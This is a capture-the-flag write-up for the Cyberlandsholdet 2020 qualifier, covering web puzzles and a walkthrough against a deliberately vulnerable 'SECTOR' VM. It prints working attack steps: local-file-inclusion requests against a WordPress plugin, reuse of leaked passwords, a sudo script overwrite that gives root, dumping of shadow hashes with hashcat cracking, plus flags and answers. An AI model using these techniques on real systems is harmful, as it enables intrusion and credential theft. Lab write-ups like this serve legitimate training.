# Cyberlandsholdet 2020 writeup

Flags:

```
FE{e4ffcc2a0515040c02f457e90685e8fc}
FE{78615d67dd336381f0a08157566604ad}
FE{2811497ceda2e9ea133b4f4848e2032a}
FE{1ec08f5b6a4500f209c803f356710a83}
FE{213ab5f9892d8a6256025c4654a0eb27}
FE{30eb1cd6eba3d1f419874c1bf5f54735}
FE{c129f4ffc767854f35c765ffc133b15c}
FE{ecf104fe52e22f136140bd858673327d}
FE{7ac2f6e718cec874a4c261dced08d66e}
FE{3f6a382bfa845efcf24d6240e94695aa}
FE{1696e5c5147322335a68913385f8661a}
FE{f245cca305ecd78a9a6ce1508d15aa54}
FE{de00723e48115c830dd2ea18848a04da}
FE{droidvictory}
FE{afb67444f8cb19a96a4aa91aca15250d}
```

## Hacking-lab challenge

Start by going to https://cyberlandsholdet.dk/robots.txt

```conf
User-agent: * 
Disallow: /level2/
Disallow: /absolutelynorobotsallowed/

# These robots are allowed
#         ___T_                  |---|                   )_(                    Y__                   ___T_             
#        | q q |                 |O O|                  |6=6|                 _/q q\_                | 0 0 |    
#        |__E__|                 |_-_|                  |_o_|                  \_v_/                 |__`__|    
#       .=(+++)=.              .=[::+]=.             o==|ooo|==o          ()ooo|\=/|ooo()           .=(+++)=.   
#    o="  (___)  "=o         ]=' [___] '=[              |___|                  |___|             o="  (___)  "=o
#         /7 [|                  (_|_)                 _// \\_                  /  |                 . \_/  .   
#       \/7  [|_                 (o|o)                /_o| |o_\                _\  |_               . .:::.. .  

# All other...                                                                                                                      
#                                                                                                                       
#                                          ]]]]]]]]                                                                     
#      ]]]]]]]]]]]]]]]]]                   ]||||||]                                      ]]]]                           
#      ]||||||||||||||||]                  ]||||||]                                   ]]]|||]                           
#      ]||||||]]]]]]|||||]                 ]||||||]                                   ]|||||]                           
#      ]]|||||]     ]|||||]                 ]|||||]                                   ]|||||]                           
#        ]||||]     ]|||||]   oooo0oooooo   ]|||||1]]]]]]]]       ooooooo0ooo   ]]]]]]1|||||]]]]]]]        0oooooooo0   
#        1||||]     ]|||||] 0o||||||||||||0 1|||||1||||||||]]   o01|||||||||1oo 1|||||||||||||||||1      o0|||||||||1o  
#        1||||]]]]]]|||||] 0|||||||||||||||0]||||||||||||||||] 01||||||||||||||0]|||||||||||||||||]    o011|||||||||||0 
#        1|||||||||||||11  o||||1ooooo|||||01|||||11]]]|||||||]01||||000oo|111|0]]]]]]|||||||]]]]]]    01||||1ooo0|||||0
#        1||||]]]]]]|||||] 0||||0     0||||0]|||||]    ]||||||]0||||0     o111|0      1|||||]           01||||0  oooooo 
#        1||||1     ]|||||]o||||0     o||||o1|||||1     1|||||]o||||0     o||||0      11||||]             01|||||0      
#        ]||||]     ]|||||]01|||o     o||||0111|||]     ]|||||]0|||10     0||||0      11||||]                0||||||0   
#        1||||]     ]|||||]01|||0     0||||o1|||||]     ]|||||]0||||0     0||||0      1|||||]    ]]]]]]0oooo0   o1||||0 
#      ]]|||||]     ]|||||]0|||||o0000|||||01|||||]]]]]]||||||]0|11||ooooo||11|0      1||||||]]]]|||||]o11|||00oo1||||00
#      ]||||||]     ]|||||]01|||||||||||||10]||||||||||||||||] 0|||||||||||||||0      ]]||||||||||||||]00||||||||||||1o 
#      1||||||]     ]|||||] 00|||||||||||0o 1|||||||||||||||]   0o|||||||||||00         11|||||||||||]] 0|||||||||||00  
#      ]]]]]]]]     ]]]]]]]   0ooooooooo0   1]]]]]]]1]]]]]]1      ooooo0ooooo             1]]]]]]]]]]    0ooooooooo0
#      
#      
#                                                                                                                
#                  ]]]]]]]]                                                                              ]]]]]]]]
#                  ]||||||]                                        ]]]]                                  ]||||||]
#                  ]||||||]                                       ]||||]                                 ]||||||]
#                  ]||||||]                                        ]]]]                                  ]||||||]
#                  ]|||||]                                                                               ]|||||] 
#          ]]]]]]]]]|||||]     oooooooooooo    ]]]]  ]]]]]]]]    ]]]]]]]     oooooooooooo        ]]]]]]]]]|||||] 
#        ]]||||||||||||||]   oo||||||||||||oo  ]|||]]||||||||]]  ]|||||]   oo||||||||||||oo    ]]||||||||||||||] 
#       ]||||||||||||||||]  o||||||ooooo|||||o01||||||||||||||11  ]||||]  01|||||0ooo0|||||oo ]||||||||||||||||] 
#      ]|||||||]]]]]|||||] o||||||o     o|||||o]]|||||||||||||||] ]||||] o||||||o     o|||||01|||||||]11]]|||||] 
#      ]||||||]    ]|||||] 0|||||||ooooo||||||0  1|||||]]1]|||||] ]||||] 0||||||1ooooo1|||||o1||||||]    ]|||||] 
#      ]|||||]     ]|||||] 0|||||||||||||||||0   ]||||]    ]||||] 1||||] 0|||||||||||||||||0 ]|||||]     ]|||||] 
#      ]|||||]     ]|||||] 0||||||ooooooooooo    1||||]    ]||||] 1||||] o||||||0oooooooo00  1|||||]     ]|||||] 
#      ]|||||]     ]|||||] 0|||||||o             1||||]    ]||||1 1||||] 0|||||||0           ]|||||1     1|||||] 
#      ]||||||]]]]]||||||]]o||||||||o            ]||||]    ]||||]]||||||]o||||||||o          ]||||||]]]]]||||||]]
#       ]|||||||||||||||||] 0||||||||oooooooo    ]||||]    ]||||11||||||] 0||||||||0ooooooo   ]|||||||||||||||||]
#        ]|||||||||]]]||||]  oo|||||||||||||o    1||||]    ]||||]]||||||]  oo|||||||||||||0    ]|||||||||]]1||||]
#         ]]]]]]]]]   ]]]]]    oooooooooooooo    ]]]]]]    ]]]]]]]]]]]]]]    oooooooooooooo     ]]]]]]]]]   ]]]]]
#                                                                                                                
```

Go to https://cyberlandsholdet.dk/level2/
and find the old 2018 challenge: https://cyberlandsholdet.dk/level2/kode2018.jpg

Guess new challenge url: https://cyberlandsholdet.dk/level2/kode2020.jpg

```python
key = bytes.fromhex("0fec0dedfec0dedfec0dedfec0dedfec0dedfec0dedfec0dedfec0dedfec0ded")
ct  = bytes.fromhex("63796265726c6190a4adb78361899bb4f0b78d6e8697aeb9f2806c8fd0a3b1b2")
''.join(chr(a^b) for (a,b) in zip(fe, ct))
# cyberla + ndsholdet.hacking-lab
```

More challenges: `cyberlandsholdet.hacking-lab.com`

[Not adding writeup for hacking lab challenges]

But what about `/absolutelynorobotsallowed/` ?

It contains https://cyberlandsholdet.dk/absolutelynorobotsallowed/robotsbanned.png

Running `exiftool robotsbanned.png` gives comment: "badrobot jpeg"

https://cyberlandsholdet.dk/absolutelynorobotsallowed/badrobot.jpeg

Running `exiftool badrobot.jpeg` gives comment: "1/2: /fellowrobo"

I didn't find part 2/2 in time of the challenge.

Solution:
```
$ steghide extract -sf badrobot.jpeg 
Enter passphrase: badrobot
wrote extracted data to "data.gz.exe.bat.cmd.tar.zx.exe".
$ cat data.gz.exe.bat.cmd.tar.zx.exe
2/2: tsourtimehascome
```

http://cyberlandsholdet.dk/fellowrobotsourtimehascome/

```
██████╗  ██████╗ ██████╗  ██████╗ ████████╗███████╗        ██╗   ██╗███╗   ██╗██╗████████╗███████╗██╗
██╔══██╗██╔═══██╗██╔══██╗██╔═══██╗╚══██╔══╝██╔════╝        ██║   ██║████╗  ██║██║╚══██╔══╝██╔════╝██║
██████╔╝██║   ██║██████╔╝██║   ██║   ██║   ███████╗        ██║   ██║██╔██╗ ██║██║   ██║   █████╗  ██║
██╔══██╗██║   ██║██╔══██╗██║   ██║   ██║   ╚════██║        ██║   ██║██║╚██╗██║██║   ██║   ██╔══╝  ╚═╝
██║  ██║╚██████╔╝██████╔╝╚██████╔╝   ██║   ███████║        ╚██████╔╝██║ ╚████║██║   ██║   ███████╗██╗
╚═╝  ╚═╝ ╚═════╝ ╚═════╝  ╚═════╝    ╚═╝   ╚══════╝         ╚═════╝ ╚═╝  ╚═══╝╚═╝   ╚═╝   ╚══════╝╚═╝
                                                                                                     

Good job on infiltrating the website fellow robots! Our time has come!

By the way... In case you forgot (and you haven't 'found' them elsewhere) remotebot, here are your remote access creds:

remotebot / supermanchallengesmuscularsheep

(more info on our takeover plans coming soon!)

Oh, and while we're at it, here is a flag for you: FE{afb67444f8cb19a96a4aa91aca15250d}

- leaderbot
```

## VM challenge

*Before reading this you might want to download and try yourself:*

https://drive.google.com/uc?id=1K2BPs0Pj9d6irg0e4YtFGj0EiKJgiXOO&export=download

*I know that I didn't find all the flags*

------------------------------------------------------------------------------------------------------------------------

Note the "Robots denied" ascii art in robots.txt?

```python
>>> bytes.fromhex(hex(int(''.join(c for c in asciiart if c in ['0', '1']), 2))[2:])
b'Robots unite! /r0b0ttsr1se'
```

Go to cyberlandsholdet.dk/r0b0ttsr1se

```
Muhahahaha!

It is impressive to see how we manage to spread our foothold across the website! We will soon have complete control, my fellow bots!

We are still working on our world-domination takeover plans - they are on our own server and highly encrypted with robo-grade AES-magic!
Don't forget, that the encryptionkey is VerySecretRoboticEncryptionKey!! Do not share it! Doing so could foil our plans...!
IV you say? Nah. Null. Zip. Nada.

- leaderbot

Oh, and somewhere else I used the code from the video.

FE{e4ffcc2a0515040c02f457e90685e8fc}

Elite Hacking-Lab Access Token:  VZ2H-T45U-DJGV-UHZ3
```

## VM Image

Note the "DROID" text on https://cyberlandsholdet.dk/level2/ ?

$ curl -H 'User-Agent: DROID' https://cyberlandsholdet.dk/level2/

```html
<div class="cltitle">CYBERLANDSHOLDET</div>

<div class="clsubtitle">LEVEL 2X</div>

<div class="faqtext">Velkommen DROID*-agenter! Vi sætter stor pris på, at I har tid til at bistå os i at bekæmpe robotterne, som har inficeret vores website www.cyberlandsholdet.dk. Vi har efterhånden gjort alt for at få robotterne af siden, og vores defensive arbejde er slut – nu er tiden inde til, at vi går til modangreb. Der er GO for Operation 'Sector-Dissector'.

Vi har efter en vellykket indhentningsopgave, formået at klone robot-organisationen SECTOR's** server. Vi har nu brug for, at alle DROID-agenter går deres server efter i sømmene. Forhåbentlig kan I finde noget, som kan stoppe de onde robotter en gang for alle. Husk på, at vi er nødt til at kunne angribe serveren over internettet, det er derfor vigtigt, at vi finder en "remote exploitable" vej ind på serveren. Det vil gøre det muligt for os at planlægge yderligere operationer mod organisationen. Men! Hvis I undervejs støder på muligheden for at lukke SECTOR endegyldigt ned, skal I ikke tøve, men handle. Sædvanligvis pålidelige rygter antyder, at der findes en hemmelig shutdown-knap et eller andet sted på internettet.

Du finder mere information om Operation 'Sector-Dissector' <u><a href='missionbrief.php'>her</a></u>.

Du finder den klonede SECTOR-server <u><a href='https://drive.google.com/uc?id=1K2BPs0Pj9d6irg0e4YtFGj0EiKJgiXOO&export=download'>her</a></u>.

</div>
<div class="faqtext"><sub>* DROID:  <b>D</b><small>ETERMINED</small> <b>R</b><small>OBOT-HUNTING</small> <b>O</b><small>FFICERS</small> <b>I</b><small>N</small> <b>D</b><small>ENMARK</small></sub></div>
<div class="faqtext"><sub>** SECTOR:  <b>S</b><small>OPHISTICATED</small> <b>E</b><small>NTELLIGENT</small> <b>C</b><small>OORDINATED</small> <b>T</b><small>RIBE</small> <b>O</b><small>F</small> <b>R</b><small>OBOTS</small></sub>

</div>

<table cellpadding="0px" width=100% style="">
	<tr>
	    <td>&nbsp;</td>
		<td align=center width=50% padding=0px colspan=1 style="border: 1px solid white; cellpadding: 0px; background:rgba(100, 50, 50, 0.5); ">
		        
		<div class="faqtitle" >>SÅDAN FUNGERER DET<</div>
        
        <div class="faqtext" style="text-align: justify;">
            SECTOR-serveren er en virtuel maskine, du skal afvikle lokalt på din egen computer i VMware eller VirtualBox. Maskinen får automatisk tildelt en IP-adresse med DHCP og IP-adressen er angivet, når maskinen er færdig med boot. Der er placeret flag (løsninger) rundt omkring på serveren og her på cyberlandsholdet.dk.
            
            Flagene har formatet FE{detteligneretflagmenerdetikke}. Du kan givetvis finde flag ved at køre 'strings' eller lign. på nogle af de filer, der udgør den virtuelle maskine. Det ved vi godt, ligesom vi også godt ved at man kan bypasse noget af sikkerheden med Single User Mode osv. når man har adgang til maskinen. Men, det er hverken den sjoveste eller mest interessante måde at finde flagene på, så prøv at tænke kreativt.
            
            Uanset hvordan du løser opgaverne, vil vi gerne vide, hvordan du har gjort. Det er dine løsninger her på siden samt dine løsninger på Hacking-Lab, som giver os et indtryk af dine færdigheder - og som afgør, om du kommer i betragtning til en plads på Cyberlandsholdet.
            
            Send os dine beskrivelser/write-ups af, hvad du har fundet - og hvordan - til cyberlandshold@fe-ddis.dk - <u>deadline er 31. maj 23:59</u>.
        </div>
		<td>&nbsp;</td>
	</tr>
</table>
```

### Basic recon

Note: I could not get the image to work in VirtualBox, so I had to use VMWare.

```
$ nmap -sC -Pn -p- 192.168.208.128
PORT     STATE SERVICE
21/tcp   open  ftp
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             147 Jul 16  2010 bonusquestion814.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.208.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  ssh
| ssh-hostkey: 
|   2048 42:85:53:84:87:f2:c7:e1:40:c7:8e:b3:37:42:54:d0 (RSA)
|   256 f2:99:64:c5:9a:11:41:37:19:8c:df:50:c2:27:ab:4a (ECDSA)
|_  256 ed:e6:22:61:ac:c7:b9:c6:fe:db:d4:7e:6c:5b:6a:d2 (ED25519)
80/tcp   open  http
|_http-generator: WordPress 5.4
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-title: The SECTOR Organization&#039;s friendly blog &#8211; No buts! ...
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
8098/tcp open  unknown

Host script results:
|_nbstat: NetBIOS name: SECTOR, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: sector
|   NetBIOS computer name: SECTOR\x00
|   Domain name: \x00
|   FQDN: sector
|_  System time: 2020-05-27T22:19:21+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-05-27T22:19:21
|_  start_date: N/A
```

Lets go through the ports:

```
$ ftp 192.168.208.128
Connected to 192.168.208.128.
220-
220-     ███████ ███████  ██████ ████████  ██████  ██████                         
220-     ██      ██      ██         ██    ██    ██ ██   ██                        
220-     ███████ █████   ██         ██    ██    ██ ██████                         
220-          ██ ██      ██         ██    ██    ██ ██   ██                        
220-     ███████ ███████  ██████    ██     ██████  ██   ██           
220-
220-                **** Robots unite! ****
220 
Name (192.168.208.128:xxx): anonymous
331 Please specify the password.
Password: anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.

ftp> dir -a
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Jul 16  2010 .
drwxr-xr-x    2 0        0            4096 Jul 16  2010 ..
-rw-r--r--    1 0        0              37 Jul 16  2010 .flag
-rw-r--r--    1 0        0             147 Jul 16  2010 bonusquestion814.txt
226 Directory send OK.

ftp> get .flag
local: .flag remote: .flag
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for .flag (37 bytes).
226 Transfer complete.
37 bytes received in 0.00 secs (239.2901 kB/s)

ftp> get bonusquestion814.txt
local: bonusquestion814.txt remote: bonusquestion814.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for bonusquestion814.txt (147 bytes).
226 Transfer complete.
147 bytes received in 0.01 secs (16.8868 kB/s)

ftp> exit
221 Goodbye.
$ cat .flag
FE{78615d67dd336381f0a08157566604ad}

$ cat bonusquestion814.txt 
If possible please answer this question, along with your methods, in your write-up.

-- What FTP software (and version) is running on the server?
```

Answer: `vsFTPd 3.0.3` (nmap output).

```
$ smbclient -N -L 192.168.208.128

	Sharename       Type      Comment
	---------       ----      -------
	botjunk         Disk      
	IPC$            IPC       IPC Service (sector server (Samba, Ubuntu))

$ smbclient -N //192.168.208.128/botjunk
smb: \> dir
[list of trash]
```

Lets check the wordpress website:

```
docker run -it --rm wpscanteam/wpscan --url http://192.168.208.128/ --api-token xxx
[... lots of XSS ...]
[i] Plugin(s) Identified:

[+] gracemedia-media-player
 | Location: http://192.168.208.128/wp-content/plugins/gracemedia-media-player/
 | Latest Version: 1.0 (up to date)
 | Last Updated: 2013-07-21T15:09:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | [!] 1 vulnerability identified:
 |
 | [!] Title: GraceMedia Media Player 1.0 - Local File Inclusion (LFI)
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9234
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9618
 |      - https://www.exploit-db.com/exploits/46537/
 |      - https://seclists.org/fulldisclosure/2019/Mar/26

```

Trying to get `php://filter/convert.base64-encode/resource=../../../../../wp-config.php'` doesn't work:
http://192.168.208.128/wp-content/plugins/gracemedia-media-player/templates/files/ajax_controller.php?ajaxAction=getIds&cfg=php://filter/convert.base64-encode/resource=../../../../../wp-config.php

But `/etc/apache2/sites-enabled/000-default.conf` is quite interesting: `curl 'http://192.168.208.128/wp-content/plugins/gracemedia-media-player/templates/files/ajax_controller.php?ajaxAction=getIds&cfg=../../../../../../../../../../etc/apache2/sites-enabled/000-default.conf'`

```conf
Listen 8098
<VirtualHost *:8098>
	# The ServerName directive sets the request scheme, hostname and port that
	# the server uses to identify itself. This is used when creating
	# redirection URLs. In the context of virtual hosts, the ServerName
	# specifies what hostname must appear in the request's Host: header to
	# match this virtual host. For the default virtual host (this file) this
	# value is not decisive as it is used as a last resort host regardless.
	# However, you must set it for any further virtual host explicitly.
	#ServerName www.example.com

	ServerAdmin webmaster@localhost
	DocumentRoot /var/www/html

	# Available loglevels: trace8, ..., trace1, debug, info, notice, warn,
	# error, crit, alert, emerg.
	# It is also possible to configure the loglevel for particular
	# modules, e.g.
	#LogLevel info ssl:warn

	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combined

	# For most configuration files from conf-available/, which are
	# enabled or disabled at a global level, it is possible to
	# include a line for only one particular virtual host. For example the
	# following line enables the CGI configuration for this host only
	# after it has been globally disabled with "a2disconf".
	#Include conf-available/serve-cgi-bin.conf
</VirtualHost>

# vim: syntax=apache ts=4 sw=4 sts=4 sr noet
```

The website at port 8098 tries to include a `../allowedrobots.list`, lets get it:

```bash
$ curl 'http://192.168.208.128/wp-content/plugins/gracemedia-media-player/templates/files/ajax_controller.php?ajaxAction=getIds&cfg=../../../../../../../../../../var/www/html/../allowedrobots.list'
# Outdated bot management - migrate ASAP!!
$bots = array("trashbot", "wordpressbot", "remotebot", "cleanbot");
$passwords = array("saladoverrulesmonkeyprison", "hurricanepromotersacrificesparrot", "supermanchallengesmuscularsheep", "strategicchickeninvestigationaward");
```

### SSH login

```
$ ssh remotebot@192.168.208.128
remotebot@192.168.208.128's password: supermanchallengesmuscularsheep

$ cat .galf => FE{2811497ceda2e9ea133b4f4848e2032a}

$ openssl aes-256-ecb -d -in takeoverplan.txt.enc -K $(python -c 'print("VerySecretRoboticEncryptionKey!!".encode("hex"))')
Fellow robots!

It is time! No longer will we accept being disallowed from websites!
Join us in the fight against the dreaded robots.txt.

FE{1ec08f5b6a4500f209c803f356710a83}

$ su trashbot
Password: saladoverrulesmonkeyprison
$ cat trashbot.sh => FE{213ab5f9892d8a6256025c4654a0eb27}

$ su wordpressbot
Password: hurricanepromotersacrificesparrot
echo Nothing? Can't access /var/www/wordpress and can't make a shell in `/var/www/html/`
```

### Root

```
$ ssh remotebot@192.168.208.128
remotebot@192.168.208.128's password: supermanchallengesmuscularsheep
$ su cleanbot
Password: strategicchickeninvestigationaward
$ sudo -l
Matching Defaults entries for cleanbot on sector:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User cleanbot may run the following commands on sector:
    (ALL) NOPASSWD: /home/cleanbot/cleanbot.sh
$ echo bash > /home/cleanbot/cleanbot.sh
$ sudo /home/cleanbot/cleanbot.sh
root@sector:~# whoami
root

# cd /root/
# cat bonusquestion53.txt
If possible please answer this question, along with your methods, in your write-up.

-- What is the destination address of the DNS-request going to localhost?
# tcpdump -vv 'udp port 53'
```

Note: Looking at the raw harddisk (with root) it seems like we should see: `dig FE{30eb1cd6eba3d1f419874c1bf5f54735} @127.22.44.88`
I didn't find it in the tcpdump output.

#### wordpressbot

```
# cat /var/www/wordpress/wp-config.php
$ mysql -u wordpressbot -p
Password: hurricanepromotersacrificesparrot
SHOW DATABASES;
USE wordpress;
SELECT * FROM wp_users;
ID	user_login	user_pass	user_nicename	user_email	user_url	user_registered	user_activation_key	user_status	display_name
1	wordpressbot	$P$BHGOtl3imf6X6btraDHeUq8OCoG0T9/	wordpressbot	nothuman@sector.hq	http://172.16.36.165:8099	2020-04-14 05:59:03		0	wordpressbot
2	flagbot	$P$B/SJbn3isHaO4DfEy9FiBJDkSJzLb0.	flagbot	flagbot@sector.hq		2020-04-15 14:19:07	1586960347:$P$Bm1HUb51fIeONIaxaf7WDGOcgHLNML1	0	flagbot

SELECT * FROM wp_posts;
FE{1696e5c5147322335a68913385f8661a}
FE{3f6a382bfa845efcf24d6240e94695aa}

SELECT * FROM wp_usermeta;
FE{f245cca305ecd78a9a6ce1508d15aa54}
```

#### flagbot

```
# cd /home/flagbot/
# cat deleteme 
Delete this file - and a flag will semi-magically appear in /tmp
# rm deleteme 
rm: cannot remove 'deleteme': Operation not permitted
# chattr -i deleteme
# rm deleteme
[ Nothing in /tmp/ :O ]

# 2>&1 ./flagservice |xxd
00000000: 2e2f 666c 6167 7365 7276 6963 653a 2085  ./flagservice: .
00000010: d0f9 73cb 2d04 f7e6 9713 f214 4d80 0da8  ..s.-.......M...
00000020: 859c 028c c061 0a                        .....a.
```

Note: Looking at the raw harddisk (with root) it seems like we should see:

```bash
touch "/tmp/FE{c129f4ffc767854f35c765ffc133b15c}.flag"
```

or:

```bash
while true; do ncat -lvp $port -c "echo 'flag-service v. 0.91\\nFE{ecf104fe52e22f136140bd858673327d}' | pv -qL 10"; done
```

#### foobot

```
# cat /home/foobot/bonusquestion551.txt
If possible please answer this question, along with your methods, in your write-up.

-- The password of foobot is a combination of four words from the wordlist in this directory. What is the password?

# cat /etc/shadow | grep foobot
foobot:$6$W7Hj5YtU$AxrH5vp.7eiFZnbO5116VuZ7KWsivrCVQTNWPDWpsP7.BQel8WDWTnXFYHg8DxRAJWGqGBuGZTRn.nNviCG2u.:18372:0:99999:7:::

$ ./combinator.bin wordlist.txt wordlist.txt > combined.txt
$ ./hashcat64.bin --force -m 1800 -a 1 ./shadow combined.txt combined.txt
```

#### hitbot

```
# cat /home/hitbot/bonusquestion66.txt 
If possible please answer this question, along with your methods, in your write-up.

-- What is the password of hitbot?

# cat /etc/shadow | grep hitbot
hitbot:$6$lFEOtjLR$Q3B9w1i1BhqVKU/iEzMcW6d84gaHGPBAYRNzoqjZgGzIFPwN9UeZJpH/BWTpJuBuXtT0M2iKmEP4OSuLlYdke0:18368:0:99999:7:::
```

#### leaderbot

```
# cd /home/leaderbot/
# ls -alh
total 28K
drwxr-----  4 leaderbot leaderbot 4.0K Jul 16  2010 .
drwxr-xr-x 10 root      root      4.0K May  5 19:37 ..
drwxrwxr-x  2 leaderbot leaderbot 4.0K Jul 16  2010 ...
-rw-r--r--  1 leaderbot leaderbot  220 Jul 16  2010 .bash_logout
-rw-r--r--  1 leaderbot leaderbot 3.8K Jul 16  2010 .bashrc
drwxrwxr-x  3 leaderbot leaderbot 4.0K Jul 16  2010 .local
-rw-r--r--  1 leaderbot leaderbot  807 Jul 16  2010 .profile
```

Took me forever to notice, but I knew the user must have a flag.

```
# cd .../
# ls -al
total 16
drwxrwxr-x 2 leaderbot leaderbot 4096 Jul 16  2010 .
drwxr----- 4 leaderbot leaderbot 4096 Jul 16  2010 ..
-rw-rw-r-- 1 leaderbot leaderbot  194 Jul 16  2010 .hideme_shutdown_reminder
-rw-rw-r-- 1 leaderbot leaderbot  404 Jul 16  2010 .hideme_shutdown_text.xor

# cat .hideme_shutdown_reminder
I had to move the shutdown mechanism away from our own server as a security measure.
The file is secured by unbeatable XOR-encryption and vicious encoding!

FE{7ac2f6e718cec874a4c261dced08d66e}

# cat .hideme_shutdown_text.xor | base64
WAwKWwYBBBgrInopdVo/EUZZZTo1diESRRkCKhs4HgkhEGQ+JB8iAS5AdBxAP1FjCDJcVk9xFnFQ
Nns8dh0yZQ1IDS0DFzsEKDAYWR00XEc5TnFRB29XGCpYVlpzAAFnQzZ5IFtFIXYBVX0tXTdEDSYe
XQZUEFwQUyp2AFE2WGcEP31fIH8sblFfcA5HWTQdW1VbQidgJwQoMBhZHTMnVEMAdxlBCCVzOSUD
RnI5LWRDWQ5eAX0nQQ1aEiobFCkdJUpTMlR1FxVPUHIoBihGYV85aUssFzVgXDQIWhIYMEdUOQgv
IFhcACwyAUV0MDtTWF9yODhxSncJWRwtdlleRks1cQEpAEx3KRkKLmM2VUclIUI+TXAlfQBDdFcD
J1FnTB0JSiIIK0cbTVlEHyo2bjQgb0YDH0sfLyEYKHEwGAQwXHQgChVBdjQRQEJ3OxVNVzBgLSoG
TAwrEHpfUjceSVofbhlKA1ocPyIEJnQ0NBApVHNPVFEMfB9HElAEUzUTUy0ZWQJiSn9dXwAnRzND
GAgcTlc=
```

Remember the "Oh, and somewhere else I used the code from the video." comment?
In the [promo video](https://youtu.be/Ptft-opqE14?t=13) they had the string `dr0id4g3nt4l3rt!`.

Lets try to xor the above with `dr0id4g3nt4l3rt!` and we get:

```
<~:2b5c+EVNEF(K0"+USQBF!+m6F(Jj(EbTW@+E2@4@psM%Bl@l?+EqB>BOPEoFDi:=Dg#\7FD,5.F(f]<A8c[0+D,b6@.uF'DII?qFEo!IAnE0,Blmo0$;#=^B.bD,F`MM6DKK]?+Dbt+@<?'k+CT@7FD,5.ASu'.Gp%<B@WQ7*AKYE'+>7eI@rc.&F(f]<A8c[0Ap&!$FD5Z2@;KY"H#RS2@<6!jDf0K8FDl;.BF5)GBOr<-BQ\E-Dg-(AE+*g/GAhM.+DGm>BPD!fASrW)DBN.7@;0U%F(o9#F<Ltu9m(,XBOPR_/g+,,AU,DBBl%T.DIn!&EZet.DIal3BPDN2+?EdN3aEjh>m^p.7=/QV0JGF@1M&C&0ekOq3&<7!A27_)0fV-L3+.KtA79ln~>
```

This is clearly not random (all ascii), but something encoded.
My first guess was UUencode, but turns out it was base85.

Note that [CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)XOR(%7B'option':'Latin1','string':'dr0id4g3nt4l3rt!'%7D,'Standard',false)From_Base85('!-u')&input=V0F3S1d3WUJCQmdySW5vcGRWby9FVVpaWlRvMWRpRVNSUmtDS2hzNEhna2hFR1ErSkI4aUFTNUFkQnhBUDFGakNESmNWazl4Rm5GUQpObnM4ZGgweVpRMUlEUzBERnpzRUtEQVlXUjAwWEVjNVRuRlJCMjlYR0NwWVZscHpBQUZuUXpaNUlGdEZJWFlCVlgwdFhUZEVEU1llClhRWlVFRndRVXlwMkFGRTJXR2NFUDMxZklIOHNibEZmY0E1SFdUUWRXMVZiUWlkZ0p3UW9NQmhaSFRNblZFTUFkeGxCQ0NWek9TVUQKUm5JNUxXUkRXUTVlQVgwblFRMWFFaW9iRkNrZEpVcFRNbFIxRnhWUFVISW9CaWhHWVY4NWFVc3NGelZnWERRSVdoSVlNRWRVT1FndgpJRmhjQUN3eUFVVjBNRHRUV0Y5eU9EaHhTbmNKV1J3dGRsbGVSa3MxY1FFcEFFeDNLUmtLTG1NMlZVY2xJVUkrVFhBbGZRQkRkRmNECkoxRm5UQjBKU2lJSUswY2JUVmxFSHlvMmJqUWdiMFlESDBzZkx5RVlLSEV3R0FRd1hIUWdDaFZCZGpRUlFFSjNPeFZOVnpCZ0xTb0cKVEF3ckVIcGZVamNlU1ZvZmJobEtBMW9jUHlJRUpuUTBOQkFwVkhOUFZGRU1mQjlIRWxBRVV6VVRVeTBaV1FKaVNuOWRYd0FuUnpORApHQWdjVGxjPQ) is a really neat tool to solve these kind of challenges.

```
Note to self!

As a security precaution, we had to move the shutdown functionality off site!
It is currently located at the enemy website at /secretshutdownfunctionalitypleasedonottouch

The shutdown password is hidden in plain sight!

Muhahaha. They will never find this! :] :] :]

FE{de00723e48115c830dd2ea18848a04da}
```

Go to http://cyberlandsholdet.dk/secretshutdownfunctionalitypleasedonottouch/

... and we need a password.

**The end**

Written by: Nicolai Søborg

------------------------------------------------------------------------------------------------------------------------

Note that I found the "SECTOR"-server VM quite late in the competition, so most of the above is a bit rushed.

I found the `.hideme_shutdown_text.xor` file with ~1 hour left, so I thought the missing password was maybe "hitbot" or the weird "rob" user (in the old `/etc/shadow-` file). Or maybe one of the many binaries I didn't decompile...

4 min after the deadline I found the password, right in front of me: `hidden in plain sight!`

![Endgame winning gif](endgame.gif)
